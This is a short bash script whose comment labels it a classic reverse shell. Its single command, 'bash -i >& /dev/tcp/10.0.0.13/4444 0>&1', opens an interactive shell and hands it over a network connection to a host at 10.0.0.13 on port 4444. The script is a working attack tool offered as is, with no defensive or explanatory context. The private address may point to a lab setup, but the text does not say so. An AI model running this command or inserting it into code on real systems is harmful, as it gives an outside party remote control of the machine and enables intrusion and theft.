#!/bin/bash
# Classic bash /dev/tcp reverse shell
bash -i >& /dev/tcp/10.0.0.13/4444 0>&1
